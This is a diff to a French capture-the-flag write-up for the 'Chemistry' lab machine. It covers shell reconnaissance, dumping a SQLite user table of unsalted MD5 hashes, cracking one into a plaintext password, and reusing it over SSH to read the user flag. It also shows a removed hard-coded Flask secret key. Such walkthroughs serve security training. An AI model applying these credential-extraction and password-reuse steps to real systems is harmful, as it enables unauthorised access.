@@ -689,8 +689,6 @@ Pour obtenir un `Reverse Shell`, il te suffit de remplacer `system ("ping -c 5 1
 
 **Tu obtiens un Reverse Shell dans la fenêtre Kali que tu n'as plus qu'à stabiliser avec la recette {{< recette "stabiliser-reverse-shell" >}}.**
 
-
-
 ```bash
 app@chemistry:~$ whoami
 app
@@ -698,57 +696,169 @@ app@chemistry:~$ id
 uid=1001(app) gid=1001(app) groups=1001(app)
 app@chemistry:~$ pwd
 /home/app
-app@chemistry:~$ ls -l
+```
+
+### Exploration du Reverse Shell
+
+Une fois le reverse shell obtenu, tu commences par une reconnaissance basique du système.
+
+Le listing du répertoire `/home` révèle immédiatement la présence de deux utilisateurs :
+
+```
+ls -l /home
+total 8
+drwxr-xr-x 8 app  app  4096 Oct  9  2024 app
+drwxr-xr-x 5 rosa rosa 4096 Jun 17  2024 rosa
+```
+
+- `app`
+- `rosa`
+
+En explorant le répertoire courant, tu identifies également le fichier `app.py` :
+
+```bash
+ls -l
 total 24
 -rw------- 1 app app 5852 Oct  9  2024 app.py
-drwx------ 2 app app 4096 Feb 16 15:30 instance
+drwx------ 2 app app 4096 Feb 17 11:00 instance
 drwx------ 2 app app 4096 Oct  9  2024 static
 drwx------ 2 app app 4096 Oct  9  2024 templates
-drwx------ 2 app app 4096 Feb 16 15:40 uploads
-app@chemistry:~$ cat app.py
-from flask import Flask, render_template, request, redirect, url_for, flash
-from werkzeug.utils import secure_filename
-from flask_sqlalchemy import SQLAlchemy
-from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
-from pymatgen.io.cif import CifParser
-import hashlib
-import os
-import uuid
-
-app = Flask(__name__)
-app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'
-app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
-app.config['UPLOAD_FOLDER'] = 'uploads/'
-app.config['ALLOWED_EXTENSIONS'] = {'cif'}
-
-db = SQLAlchemy(app)
-login_manager = LoginManager(app)
-login_manager.login_view = 'login'
-
-[...]
-
-if __name__ == '__main__':
-    with app.app_context():
-        db.create_all()
-    app.run(host='0.0.0.0', port=5000)
-app@chemistry:~$
+drwx------ 2 app app 4096 Feb 17 11:00 uploads
+ls -l
 ```
 
-Tu constates que le listing de l'application app.py mentionne l'**existence d'une base de données `sqlite`** 
+En consultant le fichier, tu identifies rapidement des informations exploitables.
 
-```python
+```bash
+cat app.py
+```
+
+Un élément attire immédiatement l’attention :
+
+```bash
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
 ```
 
-Tu peux la chercher avec
+L’application utilise donc une base de données **SQLite** locale nommée `database.db`.
+
+Tu peux également localiser rapidement le flag utilisateur avec :
+
+```bash
+find /home -type f -iname "user.txt" 2>/dev/null
+```
+
+La commande retourne :
+
+```bash
+/home/rosa/user.txt
+```
+
+Cela confirme que le flag se trouve dans le répertoire personnel de `rosa`
+
+------
+
+### Localisation et analyse de `database.db`
+
+Tu localises rapidement la base :
 
 ```bash
 find / -type f -iname "database.db" 2>/dev/null
-
 /home/app/instance/database.db
 ```
 
-Télécharge `database.db` sur ton Kali (recette  {{< recette "copier-fichiers-kali" >}})
+Tu télécharges ensuite la base sur ta machine (recette {{< recette "copier-fichiers-kali" >}}) puis tu l’analyses avec `sqlite3` :
+
+```
+sqlite3 database.db
+```
+
+Les tables présentes sont :
+
+```
+.tables
+structure  user
+```
+
+La table `user` contient :
+
+```bash
+SELECT * FROM user;
+1|admin|2861debaf8d99436a10ed6f75a252abf
+2|app|197865e46b878d9e74a0346b6d59886a
+3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
+4|robert|02fcf7cfc10adc37959fb21f06c6b467
+5|jobert|3dec299e06f7ed187bac06bd3b670ab2
+6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
+7|peter|6845c17d298d95aa942127bdad2ceb9b
+8|victoria|c3601ad2286a4293868ec2a4bc606ba3
+9|tania|a4aa55e816205dc0389591c9f82f43bb
+10|eusebio|6cad48078d0241cca9a7b322ecd073b3
+11|gelacia|4af70c80b68267012ecdac9a7e916d18
+12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
+13|axel|9347f9724ca083b17e39555c36fd9007
+14|kristel|6896ba7b11a62cacffbdaded457c6d92
+15|noelnac|ac703f164cd1abf7160bc4fda8099242
+```
+
+On observe plusieurs comptes accompagnés de hash de mots de passe.
+
+
+
+------
+
+### Extraction des credentials
+
+Sur l’ensemble des utilisateurs listés, le seul compte qui nous intéresse est `rosa`.
+
+Les valeurs ressemblent fortement à des **hash MD5 non salés** (32 caractères hexadécimaux).
+
+Le moyen le plus rapide consiste à soumettre ces hash à un service spécialisé comme `crackstation.net`
+
+Le hash associé à l’utilisateur `rosa` est rapidement résolu, ce qui donne :
+
+```bash
+rosa:unicorniosrosados
+```
+
+![crackstation.net pour casser le hash de l'utilisateur rosa](crackstation-rosa.png)
+
+### Accès SSH et user.txt
+
+Dans beaucoup de CTF, le mot de passe extrait de la base fonctionne également pour SSH — il est donc logique de le tester
+
+```bash
+ssh rosa@chemistry.htb
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+rosa@chemistry.htb's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)
+
+[...]
+
+rosa@chemistry:~$ 
+```
+
+Une fois connecté en SSH avec le compte `rosa`, tu peux vérifier le contenu de son répertoire personnel :
+
+```bash
+ls -l
+total 4
+-rw-r----- 1 root rosa 33 Feb 17 10:23 user.txt
+```
+
+Le fichier `user.txt` apparaît immédiatement dans le dossier personnel.
+
+Il ne te reste plus qu’à l’afficher :
+
+```bash
+cat user.txt
+8acdxxxxxxxxxxxxxxxxxxxxxxxx4479
+```
+
+Tu récupères ainsi le **flag user**
+
+
 
 ------
 
